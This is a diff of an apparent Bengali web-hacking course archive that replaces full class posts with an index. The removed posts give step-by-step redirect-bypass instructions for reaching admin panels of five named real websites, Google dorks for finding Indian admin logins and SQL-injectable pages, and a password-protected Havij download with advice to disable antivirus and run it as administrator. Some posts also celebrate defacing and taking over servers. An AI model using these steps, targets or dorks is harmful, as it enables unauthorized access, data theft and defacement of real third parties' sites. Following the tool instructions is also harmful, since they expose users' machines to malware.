+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-47)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1m0Q2mkGr_JqBAB6TWStJ1trRDDAIUjwF/view)
 
+### entry-8 — আমাদের পরবর্তী ক্লাসের জন্য Cyberfox টুলস টি সেটাপ করে নিন
 
+বিষয়: Session & Redirect · তারিখ: 2026-07-31 · ধরন: tools
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-8)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1EwXd3srfDA_bVfTPOfp_e5CXve2h2D2c/view)
 
+### entry-49 — মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
 
+বিষয়:  · তারিখ: 2026-07-28 · ধরন: information
 
-Candidato (Table) - Cidade (Passwords)
-===================================================
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-49)
 
-- [Resource](https://docs.google.com/document/d/10FjEY5eyXUc54sUamu2-uj-8m5N03Cuwf-PKuDVimcM/edit?tab=t.0)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608143074221615)
+### entry-6 — মিড এক্সামের জন্য শুভ কামনা রইলো। কোন প্রশ্ন থাকলে এই পোষ্ট থেকে সহায়তা নিয়ে নিতে পারেন। ধন্যবাদ।
 
-## Class 2 — Cyber Safety ও SQL Injection by Tools
+বিষয়:  · তারিখ: 2026-07-31 · ধরন: notices
 
-Date: 2026-07-24 · Category: recordings · ID: entry-40
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-6)
 
-ক্লাস রেকর্ড
-২৪/০৭/২০২৬
-drive.google.com
-Class record.mp4
+### entry-7 — Session hijacking / Blocking, Mid Exam prep - b66 Delta
 
-- [Resource](https://drive.google.com/file/d/1dqvQLxWdK2CCLikaGO-OMykc6lpuZZmH/view)
+বিষয়: Session & Redirect · তারিখ: 2026-07-31 · ধরন: documents
 
-## আসুন জেনে নেই - ২
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-7)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-7.txt)
 
-Date: 2026-07-25 · Category: information · ID: entry-11
+### entry-58 — Session hijacking, blocking ও Mid Exam প্রস্তুতি
 
-আসুন জেনে নেই - ২
-(SQL Injection কেন করি??)
-ডাটা বেইস(Database) কি?
-Data শর্ব্দের অর্থ হলো তথ্য বা উপাত্ত এবং base শব্দের অর্থ হলো ভিত্তি। ডাটাবেস মানে হলো তথ্যভান্ডার। আগে ডাটা স্তুপীকৃত ফাইলে তথ্যসংক্ষন করা হতো এখন ডেটাবেসে সংরক্ষন করা হয়।তবে মনে রাখতে হবে এলোমেলো ভাবে ডাটা সংরক্ষন করার মানেই ডাটাবেস না। তাহলে ডাটাবেস হলো পরষ্পরসম্পর্কযুক্ত তথ্য বা ডাটাকে নির্দিষ্ট সিকোয়েন্সে সংরক্ষন করা। যেমন করে ফার্মেসিতে ঔষদগুলো বা লাইব্রেরীতে বইগুলো সংরক্ষন করে থাকে।
-আই টি ভাষায় যেমন- USER নামক একটি ডাটাবেস, তার মধ্যে থাকতে পারে User_Id, User_Name , User_Password, User_mail, User_Contact ইত্যাদি, ইত্যাদি হতে পারে।
-DBMS (ডাটাবেজম্যানেজমেন্ট সিস্টেম) কি?
-DBMS হলো একটি সফটওয়্যার যার সাহায্যে ডাটাবেজ তৈরি করা, ডাটাবেজ পরিবর্তন করা, ডাটা সংযোজন- বিয়োজন, রক্ষণাবেক্ষণ, চাহিদা অনুসারে ডাটা ম্যানেজ(কোয়েরী) ইত্যাদি যাবতীয় কাজ হয় । এই ডাটাবেস তৈরী, সংরক্ষন ও মেনেজ করার জন্য যা প্রয়োজন তা হলো- database, table, Columns, Data, ইত্যাদি।
-DBMS (ডাটাবেজম্যানেজমেন্ট সিস্টেম) সফটওয়্যার যেমনঃ MySQL, MS SQL, Oracle ইত্যাদি, ইত্যাদি।
-ওয়েভ সাইটের ডাটাবেজে কি থাকে?
-- ওয়েভ সাইটের সকল রেজিষ্ট্রার্ড ইউজার ইনফরমেশন( নাম, পাসওয়ার্ড, মেইল, কন্টাক নাম্বার…)
-- ব্যবহৃত সকল ফাইল ইনফরমেশন
-- ব্যবহৃত সকল মিডিয়া ইনফরমেশন
-- সকল পোষ্ট ইনফরমেশন
-- ওয়েভ সার্ভার এক্সেস/ মডিফাই/ এডমিন ইউজার এবং তাদের লিমিটেশন ইনফরমেশন।
-ইত্যাদি, ইত্যাদি,, মোট কথা হলো পুরো ওয়েভ সাইট এর
-মেইন ডাটাগুলোর ইনফরমেশন বা লিংক থাকে এই ডাটাবেজে।
-এখন যদি আমরা বা কেহ কোন একটি সাইটের ডাটাবেস এক্সেস নিতে পারে বা হ্যাক করতে পারে তাহলে সাইটের এক্সেস নিতে কি আর কোন সমস্যা??
-আর কোন সাইটের যদি একবার এক্সেস(এডমিন প্যাণেল) নেয়া যায় তাহলে সাইটের তথ্য পরিবর্তন করা কি খুব কঠিন??
->> যদি এডমিন প্যাণেল/ডেসবোর্ড এক্সেস পাওয়া যায় তাহলে কি কি করা যাবে?
-সাইটের এডমিন যা যা করতে পরে এই প্যানেল থেকে আপনিও তাই করতে পারেবেন।
-আর যদি সেখান থেকে কোন ভাবে শেল(পরবর্তিতে ক্লাশ হবে) আপ করা সম্ভব হয় তাহলে কি হবে?
-হা –হা- হা… সাইটের ওয়েভ সার্ভার এক্সেস পেয়ে যাবেন। তখন সাইট আপনার মতো করে পরিচালনা করতে পারেবেন… ডিফেইস করতে পারবেন, হয়তো ঐ একটি শেল এক্সেস থেকে পুরো সার্ভার ও দখল দিতে পারবেন।
-এখন বুঝতে পারলেন তো ডাটাবেস কেন এতো গুরুত্বপূর্ণ?
-আর সেজন্যই তো যে কোন হ্যাকারের প্রাথমিক টার্গেট থাকে কোন সাইটের ডাটাবেস। ডাটাবেস থেকে তথ্য বের করার জন্য(মেইনলি এডমিন ইউজারের নাম, পাসওয়ার্ড, মেইল..) আমরা এস কিউ এল ইঞ্জেকশান ব্যাবহার করি।
+বিষয়: Session & Redirect · তারিখ: 2026-07-31 · ধরন: recordings
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608246744211248)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-58)
 
-## অফিশিয়াল যে কোন নোটিশ পেতে Arena Web Security পেজে লাইক দিয়ে রাখুন।
+### entry-4 — INFORMATIONAL POST - 02
 
-Date: 2026-07-26 · Category: notices · ID: entry-10
+বিষয়: Session & Redirect · তারিখ: 2026-08-01 · ধরন: information
 
-অফিশিয়াল যে কোন নোটিশ পেতে Arena Web Security পেজে লাইক দিয়ে রাখুন।
-আর অবশ্যই রিভিউ অপশনে গিয়ে আপনার মতামত জানাতে ভূলবেন না। বাংলা কিংবা ইংরেজি, যে কোন একভাবে রিভিউ দিলেই হবে।
-https://www.facebook.com/ArenaBangladesh/
-N.B: রিভিউ লিংক সরাসরি ওপেন না হলে পেজে গিয়ে recommendation এ ক্লিক করলেই রিভিউ দিতে পারবেন।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-4)
 
-- [Resource](https://www.facebook.com/ArenaBangladesh/reviews)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609893780713211)
+### entry-5 — আসুন জেনে নেই- ৪
 
-## Class 3 — OSINT — Open Source Intelligence
+বিষয়: Session & Redirect · তারিখ: 2026-08-01 · ধরন: information
 
-Date: 2026-07-26 · Category: recordings · ID: entry-46
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-5)
 
-ক্লাস রেকর্ড
-২৬/০৭/২০২৬
-1krgJQXBlYIQ6jv8RcXAp-LoVVgEc-GSS
+### entry-3 — Noredirect Practice
 
-- [Resource](https://drive.google.com/file/d/1krgJQXBlYIQ6jv8RcXAp-LoVVgEc-GSS/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609919597377296)
+বিষয়: Session & Redirect · তারিখ: 2026-08-02 · ধরন: information
 
-## আসুন গুগল ডর্ক সম্পর্কে একটু জেনে নেই!!
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-3)
 
-Date: 2026-07-27 · Category: information · ID: entry-9
+### entry-62 — INFORMATIONAL POST-03
 
-আসুন গুগল ডর্ক সম্পর্কে একটু জেনে নেই!!
-গুগল ডর্ক (Google Dork) কী?
-অনেকেই একে স্বাভাবিকভাবেই গুগল ডর্কিং কিংবা গুগল হ্যাকিং বলে আখ্যায়িত করে। কিন্তু কেন এই নাম? চলুন একটু জেনে আসি।
-আমরা গতানুগতিকভাবেই যে কোন কিছু সার্চ করতে গেলে বা খুঁজে পেতে গেলে গুগল সার্চ ইঞ্জিন ব্যবহার করে থাকি যা খুবই স্বাভাবিক সার্চ কিংবা নরমাল সার্চ হিসেবে বিবেচিত। তবে এর বাইরে ও গুগল সার্চ করার কিছু এডভান্স টেকনিক/ কলাকৌশল প্রয়োগের মাধ্যমে আমরা আমাদের মতো করে আউটপুট নিয়ে আসতে পারি যা আসলেই আমরা চাচ্ছি! এখন এটা কিভাবে?
-চলুন তবে আমরা একটু এর ব্যবহার এবং কার্যকর দিকগুলো জেনে নেই আসলে কি কি কাজে আমরা গুগল ডর্ক ব্যবহার করতে পারি: কোন ওয়েবসাইটের দুর্বল পয়েন্ট খুঁজে বের করা, পাবলিকলি অ্যাক্সেসযোগ্য নয় এমন ডাটাবেস, লগ ফাইল বা কনফিগারেশন ফাইল বের করা, এর মধ্যে ব্যক্তিগত গুরুত্বপূর্ণ তথ্য থাকতে পারে পাশাপাশি আমরা গুগল ডর্কিং শিক্ষা এবং গবেষণার ক্ষেত্রে উল্লেখযোগ্য ভাবে ব্যবহার করতে পারি।
-গুগল ডর্কের কিছু গুরুত্বপূর্ণ কমান্ড:
-গুগল ডর্কিংয়ের জন্য কিছু বিশেষ
-সার্চ অপারেটর
-ব্যবহার করা হয়, যেমন:
-অপারেটর ও তার ব্যাখ্যা:
-নির্দিষ্ট ডোমেইনের ভেতরে সার্চ করে
-ওয়েবসাইটের টাইটেলে এডমিন লেখা থাকলে খুঁজে দিবে
-URL-এ নির্দিষ্ট শব্দ বা স্ট্রিং আছে কিনা তা খোঁজে
-নির্দিষ্ট ফাইল টাইপ খুঁজে বের করে
-নির্দিষ্ট এক্সটেনশনের ফাইল খোঁজে
-ওয়েবসাইটের কন্টেন্টে কোন শব্দ খুঁজতে চাইলে
-ওয়েবসাইটের ক্যাশ করা সংস্করণ দেখায়
-নির্দিষ্ট ওয়েবসাইটে লিংক করা অন্য পেজ খুঁজে বের করে
-নির্দিষ্ট বাক্যাংশ বা শব্দ খোঁজার জন্য ডাবল কোটেশন ব্যবহার করা হয়
-এবার চলুন বাস্তবমুখী প্রয়োগ উদাহরণের সাথে মিলিয়ে নেই!
-আমরা সেই প্রথম ওরিয়েন্টেশন ক্লাসে একটা সিম্পল ডর্ক এর সাথে পরিচিত হয়েছি যা এডমিন প্যানেল খুজে দিত যে কোন ওয়েবসাইটের সেটা কিভাবে?
-যা ভেঙ্গে বুঝতে গেলে দাঁড়ায় ( ইউ আর এল এর ভেতর admin অথবা login.php থাকবে এমন সব ওয়েবসাইট আমার সামনে আসবে এবং তা অবশ্যই ইন্ডিয়ান ওয়েবসাইট হতে হবে যায় ইতিমধ্যেই কমান্ডে ক্লিয়ার করে দেওয়া হয়েছে .in এর মাধ্যমে। অন্যদিকে আমরা এস কিউ এল ইনজেকশন এর জন্য আরও একটি ডর্কের সাথে পরিচিত হয়েছি যা আমাদের রেনডম ওয়েবসাইটগুলোর আইডি প্যারামিটার খুঁজে দিত এটা কিভাবে?
-অনেকটা একই রকম আমরা বুঝতেই পারছি ( ইউ আর এল এর ভিতর php?id= আইডি এবং প্যারামিটার থাকবে এমন সব ওয়েবসাইট আমার সামনে আসবে এবং তা অবশ্যই ইন্ডিয়ান হতে হবে ) আপনি চাইলে এখানে .in এর পরিবর্তে টার্গেট ওয়েবসাইটের ইউআরএল দিয়েও খুঁজে দেখতে পারেন যে ওই ওয়েবসাইটের আইডি প্যারামিটার আছে কিনা। উদাহরণস্বরূপ:
-এখন এতোটুকু যদি সত্যিই বুঝে থাকেন তাহলে মন দিয়ে প্র্যাকটিস করুন এবং আপনার ইচ্ছা অনুযায়ী গুগল ডর্ক মডিফাই করতে শিখতে থাকুন কোথাও যদি বুঝতে অসুবিধা হয় অবশ্যই কমেন্টে আমাকে জানাবেন ধন্যবাদ।
+বিষয়: HTTP & HTTPS · তারিখ: 2026-08-02 · ধরন: information
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609866550715934)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-62)
 
-## হাভিজ এর পোর্টেবল ভার্সান।
+### entry-64 — Manual SQL Injection
 
-Date: 2026-07-27 · Category: tools · ID: entry-47
+বিষয়: SQL Injection · তারিখ: 2026-08-02 · ধরন: recordings
 
-হাভিজ এর পোর্টেবল ভার্সান।
-প্রথমেই বলে নেই অতি উৎসাহী হয়ে ইউ-টিউব এর বা গুগল থেকে খুঁজে খুঁজে হাভিজ বা হ্যাকিং রিলেটেড কোন টুলস্‌, সফ্টওয়্যার ডাউনলোড করবেন না। র‌্যানসামওয়ারে অথবা কি-লগিংএর স্বিকার হতে পারেন।
-আর জানেন তো এই ধরনের টুলসের জন্য এন্টিভাইরাস অফ বা বাই-পাস করতে হয়।
-সো- আনট্রাষ্টেড কিছু ডাউনলোড করে নিজের ক্ষতি করবেন না।
-হাভিজের যে ভার্সান আপনাদের দেয়া হয়েছে এর বাইরেও কিছু ভার্সান আমাদের কাছে আছে, সমস্যা হলো সেগুলো ক্র্যাক করতে হয়, অনেকই সমস্যায় পড়তে পারেন, তাই এভয়েট করা হচ্ছে।
-তাই হাভিজের একটি এডভান্স ও পোর্টেবল ভার্সন ১.৬ দিয়ে দিচ্ছি।
-ভালো কথা এটি ইন্সটল করার প্রয়োজন নেই। পোর্টেবল ভার্সান
-ডাউনলোড করবেন, আনরার (UnRar) করবেন, তারপর রান এস এডমিনিষ্ট্রেটর দিয়ে চালাবেন
-ও,
-পাসওয়ার্ডঃ aws
-লিংকঃ https://drive.google.com/file/d/1_Nq_luWvf3TUYdfIa6sRKJbhQXRtfbAQ/view
-যথারীতি হাভিজ চালাতে এন্টিভাইরাস অফ থাকা লাগবে এবং রান করাতে Run as administrator এর মাধ্যমে রান করাতে হবে।
-drive.google.com
-Havij_Pro.zip
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-64)
 
-- [Havij_Pro.zip](https://drive.google.com/file/d/1m0Q2mkGr_JqBAB6TWStJ1trRDDAIUjwF/view)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609865664049356)
+### entry-73 — 1st-Mid Exam - Cyber Security & Ethical Hacking
 
-## আমাদের পরবর্তী ক্লাসের জন্য Cyberfox টুলস টি সেটাপ করে নিন
+বিষয়:  · তারিখ: 2026-08-07 · ধরন: notices
 
-Date: 2026-07-31 · Category: tools · ID: entry-8
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-73)
 
-আমাদের পরবর্তী ক্লাসের জন্য Cyberfox টুলস টি সেটাপ করে নিন
-।
-টিউটোরিয়াল ভিডিও দেখে ব্রাউজার টি এক্সট্রেক্ট করে নিবেন । সবাই ভিডিওটি ডাউনলোড করে ভালোভাবে দেখবেন কোন প্রকার স্কিপ করবেন না । কারো যদি ব্রাউজার টি এক্সট্রেক্ট করতে কোন প্রকার প্রবলেম হয়ে থাকে তবে এ পোস্টে কমেন্টে জানাবেন ।
-ধন্যবাদ সবাইকে ।
-BROWSER FILE:
-Password: aws
-VIDEO:
-drive.google.com
-cyberfox.mkv
+### entry-80 — Cross Site Scripting (XSS)
 
-- [Cyber_Fox.zip](https://drive.google.com/file/d/1EwXd3srfDA_bVfTPOfp_e5CXve2h2D2c/view)
-- [Resource](https://drive.google.com/file/d/1NNwOQSycjxYaQGynnvbUd7qGnb4Jp2UR/view?usp=drive_link)
-- [Resource](https://drive.google.com/file/d/10huk7zPRgzq-ip8nD-SE8_EpBtlsgAvb/view?usp=drive_link)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1610713203964602)
+বিষয়: XSS · তারিখ: 2026-08-09 · ধরন: recordings
 
-## মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-80)
 
-Date: 2026-07-28 · Category: information · ID: entry-49
+### entry-79 — আসুন জেনে নেই-০৫
 
-মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
-কি অবস্থা সবার কেমন আছেন?
-আজকে মঙ্গলবার আপনাদের প্র্যাকটিস ডে..!
-আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশাপাশি আপনার যদি কোন প্রশ্ন থাকে তাও করতে পারেন। অথবা আপনি চাইলে নিম্নোক্ত টাইমে সরাসরি লাইভ সাপোর্ট সেশনে জয়েন করে নিতে পারেন।
-Meet-এ যোগদানের তথ্য:
-সময়:
-প্রথম সেশন:
-সন্ধ্যা ৭টা থেকে রাত ৯ টা পর্যন্ত
-দ্বিতীয় সেশন:
-রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
-লিঙ্ক:
-To join the video meeting, click this link:
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-কিভাবে সাহায্য পাবেন:
-আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
-ধন্যবাদ।
-meet.google.com
+বিষয়: XSS · তারিখ: 2026-08-10 · ধরন: information
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1610715763964346)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-79)
 
-## মিড এক্সামের জন্য শুভ কামনা রইলো। কোন প্রশ্ন থাকলে এই পোষ্ট থেকে সহায়তা নিয়ে নিতে পারেন। ধন্যবাদ।
+### entry-82 — Messenger Group Notice!!
 
-Date: 2026-07-31 · Category: notices · ID: entry-6
+বিষয়:  · তারিখ: 2026-08-10 · ধরন: notices
 
-মিড এক্সামের জন্য শুভ কামনা রইলো। কোন প্রশ্ন থাকলে এই পোষ্ট থেকে সহায়তা নিয়ে নিতে পারেন। ধন্যবাদ।
-আর হ্যা, এরিনা ওয়েব সিকিউরিটি পেজে লাইক এন্ড রিভিউ মাস্ট।
-https://www.facebook.com/ArenaBangladesh
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-82)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614226516946604)
+### entry-85 — Messenger Group Notice!!
 
-## Session hijacking / Blocking, Mid Exam prep - b66 Delta
+বিষয়:  · তারিখ: 2026-08-12 · ধরন: notices
 
-Date: 2026-07-31 · Category: documents · ID: entry-7
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-85)
 
-ডিরেক্ট ক্লাস রিসোর্স লিংক
-docs.google.com
-Session hijacking / Blocking, Mid Exam prep - b66 Delta
+### entry-88 — SQLi WAF ও IDS
 
-### Notes
+বিষয়: WAF · তারিখ: 2026-08-14 · ধরন: recordings
 
-Admission dept hotline: +8801310333444 (WhatsApp)
-Diploma module: https://drive.google.com/file/d/1zUvuT2YHsbMWECLM0eCmvTh3nMh1GM2g/view
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-88)
 
+### entry-87 — Errorbased SQLi
 
-Session hijacking / Blocking, Mid Exam prep - b66 Delta
+বিষয়: SQL Injection · তারিখ: 2026-08-15 · ধরন: classes
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-87)
 
-সবাই পোর্টালে লগিন করে উপস্থিতি দিয়ে দিন।  https://hw.arenaclass.stream/
+### entry-90 — Burp Suite — Proxy ও Intruder
 
+বিষয়: Burp Suite · তারিখ: 2026-08-16 · ধরন: recordings
 
-Cyber fox: https://www.facebook.com/groups/awsb66delta/posts/1610713203964602
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-90)
 
+### entry-99 — WebShell, Backdoor ও Deface Page
 
-সবাই সাইবার ফক্স ব্রাউজারটা চালু করে নিন। ক্লাসের টুলস হিসেবে মঙ্গলবার দেওয়া হয়েছিলো। কারো এখনো করা না থাকলে পোষ্ট থেকে ভিডিওটা দেখে ৯ টা ৪৫ মিনিটের মধ্যে সাইবার ফক্স ওপেন করে নিবেন। ধন্যবাদ। 
-Nb: extract অবশ্যই winrar দিয়ে করে নিতে হবে, ভিডিওতে সব কিছু সুন্দর করে দেখানো আছে।
+বিষয়: WebShell · তারিখ: 2026-08-21 · ধরন: recordings
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-99)
 
+### entry-105 — আসুন জেনে নেই-০৭
 
+বিষয়: WAF · তারিখ: 2026-08-23 · ধরন: information
 
-Site: 1
-https://jjfabrics.in/admin/
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-105)
 
+### entry-107 — File Upload Vulnerabilities
 
-https://jjfabrics.in/admin/login.php
+বিষয়: File Upload · তারিখ: 2026-08-23 · ধরন: recordings
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-107)
 
-Step 1: Open cyberfox- tools - no redirect
-(no redirect)   add - https://jjfabrics.in/admin/login.php (যেই লিংকটা আমাকে ব্লক করতে হবে তা দিবো) - add -  ok
+### entry-115 — PortSwigger Labs — SQLi, XSS ও File Upload
 
+বিষয়: PortSwigger Labs · তারিখ: 2026-08-28 · ধরন: recordings
 
-Step 2: Now go to: https://jjfabrics.in/admin   (সাইবার ফক্স ব্রাউজার দিয়ে এবার শুধু এডমিন পেজে লগিন করুন, দেখবেন আপনাকে আর লগিন পেজে রিডাইরেক্ট করবে না। ডিরেক্ট এডমিন এক্সেস পেয়ে যাবেন।) 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-115)
 
+### entry-112 — Acunetix — Scanner Setup ও Reports
 
-Step 3: N.B: Your connection not secured - advance - add expectation - confirm security expectation 
+বিষয়: Acunetix · তারিখ: 2026-08-30 · ধরন: recordings
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-112)
 
+### entry-117 — Batch Scripting
 
+বিষয়: Linux & Scripting · তারিখ: 2026-09-04 · ধরন: recordings
 
-Site 2: https://sphp.in/Admin/login.php
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-117)
 
+### entry-122 — Linux Installation ও Virtual Lab Setup
 
-Site 3: https://arpantek.in/admin/login.php
+বিষয়: Linux & Scripting · তারিখ: 2026-09-06 · ধরন: recordings
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-122)
 
+### entry-121 — Linux Installation & Virtual Lab Setup
 
+বিষয়: Linux & Scripting · তারিখ: 2026-09-07 · ধরন: tools
 
-Site :4 try this one, এটা করতে পারলেই ছুটি। ;) 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-121)
 
-https://brahmaputracollege.com/admin/
-home.php    dashboard.php    banner.php   users.php  gallery.php   welcome.php
-home    dashboard    banner   users  gallery   welcome
+### entry-124 — Linux Command Line
 
+বিষয়: Linux & Scripting · তারিখ: 2026-09-11 · ধরন: recordings
 
-Site : 5 
-Try this one,
-https://sucic.org/admin/      (block)
-Link: https://sucic.org/admin/dashboard.php
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-124)
 
+### entry-126 — Crypter, Antivirus ও RAT Lab
 
+বিষয়: Malware Concepts · তারিখ: 2026-09-13 · ধরন: recordings
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-126)
 
-CW: [সীমিত প্রবেশাধিকার]
+### entry-2 — INFORMATIONAL POST-04
 
-- [Resource](https://docs.google.com/document/d/1-GJQv075oX67PWxaSWyKnsUMWyLMWbtuZQfBB37UAwU/edit?tab=t.0)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614143273621595)
+বিষয়: Malware Concepts · তারিখ: 2026-09-16 · ধরন: information
 
-## Class 4 — Session hijacking, blocking ও Mid Exam প্রস্তুতি
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-2)
 
-Date: 2026-07-31 · Category: recordings · ID: entry-58
+### entry-132 — LFI ও Web Server Security Lab
 
-ক্লাস রেকর্ড
-৩১/০৭/২০২৬
-1QHYP0xJtjfBVC4zD2GmmQ6R1jj6es76Q
+বিষয়: LFI & Server Security · তারিখ: 2026-09-18 · ধরন: recordings
 
-- [Resource](https://drive.google.com/file/d/1QHYP0xJtjfBVC4zD2GmmQ6R1jj6es76Q/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614267503609172)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-132)
 
-## INFORMATIONAL POST - 02
+### entry-130 — LFI/LFD Basics
 
-Date: 2026-08-01 · Category: information · ID: entry-4
+বিষয়: LFI / LFD · তারিখ: 2026-09-19 · ধরন: classes
 
-INFORMATIONAL POST - 02
-NO REDIRECT এর সামারী।
-এই বিষয়ে আগে একটি পোষ্ট করেছিলাম, পড়ে থাকলে আবার পড়ে নিন, তারপর এটা পড়ুন এবং একটু পরে একটি পুরনো ভিডিও শেয়ার করে দিব, সো আসুন জেনে নেই-৫ এবং এই পোষ্ট সাথে পরবর্তি ভিডিও দেখে নেমে পড়ুন যুদ্ধে .....
-No Redirect এড-অন্স টি কাজ করার জন্য শর্ত ২টি -
-ক) ঐ সাইট এ No Redirect এড-অন্স দিয়ে ট্রাই করা যাবে যে সকল সাইটের URL এ
-‍
-site name(website name. net or .com or org or com.in or....) এর পর /admin বা /administrator থাকবে এমন কোন লিংক।
-এবং
-খ) সেই লিংকে ক্লিক করলে অন্য কোন লিংকে যদি সাইট রি-ডাইরেক্ট করে যায় (মানে আমি দিলাম www.ahaque .com/admin/menu.php কিন্তু URL এ লিংক চলে অসলো www.ahaque .com/login.php)
-তাহলেই বুঝতে হবে এই সাইটে নো-রিডাইরেক্ট বাগ আছে এবং শুধুমাত্র এই রকম সাইটেই আমরা ট্রাই করতে পারি।
-এই সকল সাইট পাবো কেমন করে?
-প্রথম দিনে মনে আছে আমরা কিছু ডর্ক দিয়ে এডমিন প্যানেল সাইট খুঁজে ছিলাম, সেই টাইপ ডর্ক দিয়ে খুঁজতে হবে, যাতে শর্ত নাম্বার ”ক” ফুলফিল করে(মানে সাইটে /admin বা /administrator থাকে।
-এর বাইরেও আরো কিছু ডর্কঃ
-1: intitle:"index" of "admin" site:
-2: intitle:"index" of "admin" "framework" site:.in
-3: intitle:"index" of "admin" "pdf" site:
-4: intitle:"index" of "admin" "gallery" site:
-5: intitle:"index" of "admin" "image" site:
-6: intitle:"index" of "admin" "upload" site:
-7: intitle:"index" of "admin" "banner" site:
-8: intitle:"index" of "admin" "file" site:
-9: intitle:"index" of "admin" "page" site:
-10: intitle:"index" of "admin" "news" site:
-11: intitle:"index" of "admin" "views" site:
-12: intitle:"index" of "admin" "include" site:
-13: intitle:"index" of "admin" "picture" site:
-14: intitle:"index" of "admin" "photos" site:
-15. inurl: admin/login.php site:.in
-নিজে নিজে ডর্কগুলো মডিফাই করে নিন, কিছু নতুন বানিয়ে নিন ...
-কিছু কিছু সাইটে সাদা স্ক্রিন আসে??
-তার মানে ঐ লিংকএর বাগ সাইট এডমিন ফিক্স করে দিয়েছে, অন্য লিংক এ ট্রাই করতে হবে।
-যে সাইটে হবে না!
-অবশ্যই ওয়ার্ড -প্রেস সাইটে হবে না।
-নো-রিডাইরেক্ট এর জন্য আমরা কিভাবে জানবো সাইটে কোন ফাইল এক্সেসেবল কিনা?
-সেজন্য হ্যাকবারে Cyber 71 Privet Exploits এর একটি লিংক দেয়া আছে সেটা ব্যবহার করতে পারেন।
-সেটাতে যে সকল লিংক গ্রীন কালারে ৩০০, ৩০১, ৩০২ দেখাবে সেই লিংকটাতে ট্রাই করবো।
-এবার নিচের ৪টি ছবি দেখুন।
-১) হোয়াইট স্ক্রিণ, মানে ঐ লিংকের নো-রিডাইরেক্ট বাগ ফিক্স হয়ে গেছে।
-‍
-২) হ্যাকবার থেকে Cyber 71 Privet Exploits এর লিংক
